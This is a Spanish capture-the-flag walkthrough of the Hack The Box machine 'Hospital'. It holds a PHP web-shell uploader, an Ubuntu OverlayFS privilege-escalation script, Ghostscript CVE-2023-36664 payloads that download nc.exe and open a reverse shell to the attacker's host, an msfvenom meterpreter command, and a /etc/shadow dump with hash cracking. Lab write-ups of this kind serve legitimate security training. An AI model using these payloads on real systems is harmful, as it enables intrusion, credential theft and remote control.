---
description: https://app.hackthebox.com/machines/Hospital
---

# 🟨 HTB - Hospital

Información General

<div align="left">

<figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

</div>

* **Nombre de la Máquina: Hospital**
* **IP de la Máquina:**  10.10.11.241
* **Sistema Operativo: Windows**
* **Dificultad: Medium**
* **Fecha de Publicación:  18-11-2023**



***

### Enumeración

#### Ping para obtener ruta de retorno

Realizamos un ping a la máquina objetivo para verificar la conectividad y obtener información sobre la ruta utilizando la opción `-R` para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.241 -R
```

<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

El valor de TTL (Time To Live) igual a 127 puede ser indicativo de que el sistema operativo de la máquina objetivo es Windows. El TTL es un valor en el campo de los paquetes IP que indica la duración que un paquete puede estar en una red antes de ser descartado. <mark style="color:yellow;">**Windows establece por defecto el valor de TTL de sus paquetes IP en 128**</mark>, que al pasar por un salto en la red se decrementa a 127.

#### **Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la máquina objetivo. Utilizamos las opciones `-p-` para escanear todos los puertos, `--open` para mostrar solo los puertos abiertos, `-sS` para un escaneo de tipo TCP SYN, `--min-rate 5000` para establecer la velocidad mínima de paquetes y `-vvv` para un nivel de verbosidad alto. Además, utilizamos `-n` para desactivar la resolución de DNS, `-Pn` para no realizar el escaneo de ping, y `-oG allPorts` para guardar la salida en un archivo con formato Greppable <mark style="color:yellow;">para luego utilizar nuestra función extractPorts</mark>:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.241 -oG allPorts
</strong>extractPorts allPorts
</code></pre>

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Escaneo detallado con Nmap**

Posteriormente, realizamos un escaneo más detallado de los puertos identificados utilizando la opción `-sCV` para detección de versiones y scripts de enumeración de servicios. Específicamente, indicamos los puertos a escanear con `-p __PORTS__` (reemplazando `__PORTS__` con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre `targeted`:

```bash
sudo nmap -sCV -p(PORTS) 10.10.11.241 -oN targeted
```

{% code overflow="wrap" %}
```bash
# Nmap 7.94SVN scan initiated Fri Mar  8 23:09:28 2024 as: nmap -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6617,6635,7227,8080,9389 -oN targeted 10.10.11.241
Nmap scan report for 10.10.11.241
Host is up (0.27s latency).

PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-03-09 11:09:23Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2024-02-27T12:01:14
|_Not valid after:  2024-08-28T12:01:14
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-09T11:10:31+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6617/tcp open  msrpc             Microsoft Windows RPC
6635/tcp open  msrpc             Microsoft Windows RPC
7227/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m44s, deviation: 0s, median: 6h59m44s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-09T11:10:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 23:11:23 2024 -- 1 IP address (1 host up) scanned in 114.88 seconds

```
{% endcode %}

Hacemos un análisis de nuestro targeted. En mi caso utilizo ChatGPT para que no se me pase nada, subo un resumen de lo que me pareció interesante:

{% code overflow="wrap" %}
```bash
LDAP en los puertos 389 y 636 (SSL): La presencia de Active Directory se confirma por LDAP. Los ataques como el dumping de usuarios, grupos y otros objetos de AD son un objetivo principal. Además, la versión SSL podría ser vulnerable a ataques como Heartbleed dependiendo de la versión de OpenSSL.

Microsoft RPC, SMB, y otros servicios de Windows: Abren un abanico de posibles vectores de ataque como el paso de hashes, exploits específicos contra versiones vulnerables, y enumeración de información del dominio.

HTTP(S) en los puertos 443 y 8080: El puerto 443 está corriendo Apache en Windows con una versión obsoleta de OpenSSL, lo cual podría ser explotable. El puerto 8080 también está corriendo Apache, pero en Ubuntu, y presenta una página de login, lo cual indica un posible vector de ataque a través de inyección SQL, fuerza bruta, o vulnerabilidades web específicas.

Terminal Services en el puerto 3389: La presencia de servicios de Terminal indica la posibilidad de acceso remoto. Podrían explorarse técnicas como el ataque de credenciales, RDP hijacking o vulnerabilidades específicas de RDP.

Información de configuración y certificados SSL: Los detalles extraídos sobre la configuración de los servicios, como los nombres comunes y las fechas de validez de los certificados SSL, pueden revelar información sobre la infraestructura interna, políticas de seguridad y potencialmente indicar vectores de ataque a través de SSL/TLS.

.NET Message Framing en el puerto 9389: Este servicio podría ser interesante explorar para vulnerabilidades específicas de .NET o malas configuraciones.
```
{% endcode %}

Modificando /etc/hosts

Para añadir la entrada "10.10.11.241 hospital.htb" al archivo `/etc/hosts`, puedes usar el siguiente comando en la terminal:

```bash
echo "10.129.118.9 dc.hospital.htb hospital.htb" | sudo tee -a /etc/hosts
```

Este comando añade la dirección IP `10.10.11.241` asociada al nombre de host `dc.hospital.htb` al archivo `/etc/hosts` de tu sistema.



#### Exploración de puerto 8080

En el proceso de exploración y análisis de seguridad de nuestro objetivo, tras efectuar un escaneo detallado con `nmap`, se identificó una aplicación web en ejecución en el puerto 8080. El detalle crucial que llamó nuestra atención fue la mención de "resource login.php" en los resultados del escaneo, lo que sugiere una posible superficie de ataque a través de esta página web.

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

&#x20;Procedí a crear mi propio usuario para profundizar en la funcionalidad de la página. Una vez dentro, descubrí una funcionalidad particularmente interesante: un uploader de imágenes. Este descubrimiento abre una nueva vía de investigación, ya que los <mark style="color:yellow;">uploaders de archivos</mark> son notorios por ser puntos de entrada para varios vectores de ataque si no están adecuadamente asegurados.

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Explotación

El próximo paso en mi investigación será intentar burlar los filtros implementados en el uploader de imágenes. El objetivo será intentar subir un archivo PHP, lo cual, si tiene éxito, podría permitirme ejecutar código arbitrario en el servidor.

Primero creamos nuestra imagen para luego subirla con el uploader al sitio, usamos Repeater de Burpsuite para modificar el contenido de la imagen.

```bash
touch upload.png; echo test > upload.png
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Despues de muchas pruebas me doy cuenta que la extension .phar permite ejecución de código php. Por lo que modifico el formato de uploader.jpg a uploader.phar.  De esa forma podemos subir nuestro uploader.php, les dejo el código fuente de este uploader. (Una joyita antigua).

{% code title="UploadShell.php" overflow="wrap" %}
```php
<?php
echo "<title>RevSlideR 2015</title><br><br>";
$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4,1ON(BuSuX)";
}
else {$safemode = false; $hsafemode = "OFF(WoKeH)";}
$os = wordwrap(php_uname(),90,"<br>",1);
$xos = "Safe-mode:[Safe-mode:".$hsafemode."] 7 [OS:".$os."]";
echo "<center> ".$xos." </center><br>";

if(isset($_GET['x'])){
echo "<title>PiNDaH 2015</title><br><br>";
$source = $_SERVER['SCRIPT_FILENAME'];
$desti =$_SERVER['DOCUMENT_ROOT']."/default.php";
copy($source, $desti);
}

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
	else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
}
?>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que intentaré subir una shell para luego hacer un reverse shell :imp:. Asi que entre tantas escojo a yaps.php ([https://github.com/tennc/webshell/tree/master/php/YAPS](https://github.com/tennc/webshell/tree/master/php/YAPS)).

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Recuerda configurar la shell apuntando a tu maquina y a tu a puerto. Con YAPS me deja "estabilizar la shell"...&#x20;

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Al buscar sobre `Linux webserver 5.19.0-35 (puedes revisar haciendo uname -a)`  Podemos encontrar que es vulnerable al siguiente CVE: [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

{% code overflow="wrap" %}
```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash2 && chmod 4755 /var/tmp/bash2 && /var/tmp/bash2 -p && rm -rf l m u w /var/tmp/bash2")'
```
{% endcode %}

Por alguna extraña razon, pero creo que es porque varios usuarios estabamos tratando de pwnear la máquina, habian varios exploits en algunos directorios. Cuando intenté ejecutar el CVE me daba error ya que intentaba crear la carpeta /var/tmp/bash y decía que estaba "busy". Así que modifiqué el exploit cambiando el nombre de la carpeta a otro y funcionó el exploit:

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Hacemos un cat `/etc/shadow/` Para encontrar el hash de drwilliams y luego crackeamos el hash con john.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

En la etapa de enumeración encontramos un webmail en `dc.hospital.htb`, intentamos ingresar las credenciales de drwilliams en el webmail, ingresando con éxito.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption><p>Correo de drbrown</p></figcaption></figure>

Entonces empiezo a ver los correos y en el correo de drbrown comenan el uso de archivos **\*.eps** y que son visualizados con **GhostScript.** De inmediato busco en Google sobre alguna vulnerabilidad y me encuentro con  [**CVE-2023-36664-Ghostscript-command-injection**](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)**. Vale la pena intentarlo así que estudio el exploit.**\
\
**Lo primero que nos gustaría hacer es que cuando la victima abra el archivo \*.eps se descargue en su máquina nc.exe desde nuestro servidor, para luego enviarle otro \*.eps con un reverse shell.**

{% code overflow="wrap" %}
```bash
sudo python3 gs.py --generate --payload "curl 10.10.14.35:8888/nc.exe -o nc.exe"  --
filename curl --extension eps
```
{% endcode %}

A  la vez dejamos montado todo (nuestro servidor compartiendo el archivo nc.exe).&#x20;

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Y con éxito podemos ver que la maquina a descargado nuestro nc.exe.&#x20;

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Decido generar otro payload pero ahora utilizando el archivo nc.exe que descargamos y conectandonos a nuestra máquina. Nuevamente debo enviarle un  correo a la victima con nuestro nc a la escucha en el puerto 6666.

{% code overflow="wrap" %}
```bash
sudo python3 gs.py --generate --payload "nc.exe 10.10.14.35 6666 -e cmd.exe"  --filename reverse --extension eps
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption><p>Enviando correo a drbrown.</p></figcaption></figure>

Pero al parecer la shell no tiene suficiene fuerza, así que intentaré de otra forma con metasploit. Primero genero mi expl.exe, luego genero otro curl.eps pero que descargue el archivo expl.exe. Para luego

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=6666 -f exe -o expl.exe
```
{% endcode %}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>sudo python3 gs.py --generate --payload "curl 10.10.14.35:8888/expl.exe -o nc.exe" --filename curl --extension eps
</strong></code></pre>

Ya teniendo descargado el archivo expl.exe, creamos un expl.eps que ejecute el expl.exe. De esta forma logramos conectarnos.

{% code overflow="wrap" %}
```bash
sudo python3 gs.py --generate --payload "meterpreter.exe"  --filename expl --extension eps
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Obtenemos nuestra **primera flag**, `user.txt` :sunglasses:

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

### Escalada de Privilegios

En la carpeta /Documents/ encuentro un ghostbuster.bat el cual contiene:

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```batch
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```
{% endcode %}

Intentamos usar las credenciales para hacer una consulta en el rpcclient

```bash
rpcclient -U "drbrown" hospital.htb 
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Al parecer el Administrador con la cuenta Guest comparten permisos por lo que nos vamos a `C:\xampps\htdocs` y subimos nuestro up.php.

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Con mi up.php subo nuevamente yaps.php y de esta forma obtengo mi **segunda flag** `root.txt`

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

### Conclusión

Hospital, una máquina divertida, con muchos retos. Bypassear el uploader con el formato .phar fue algo nuevo para mí. La inyección del archivo .eps para descargar y ejecutar código malicioso también fue algo muy educativo.

###

